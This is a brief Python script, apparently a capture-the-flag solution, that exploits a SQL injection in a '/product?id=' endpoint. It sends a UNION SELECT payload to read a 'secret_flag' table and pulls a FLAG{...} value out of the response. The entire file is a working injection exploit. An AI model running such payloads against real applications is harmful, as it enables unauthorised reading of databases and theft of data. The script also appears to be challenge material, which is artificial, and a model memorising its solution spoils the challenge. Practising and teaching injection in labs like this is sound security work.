import re
from helper import get_raw
import urllib.parse

payload = "0 UNION SELECT flag, flag FROM secret_flag"
body = get_raw("/product?id=" + urllib.parse.quote(payload))
print(re.search(r"FLAG\{[a-z0-9_]+\}", body).group(0))
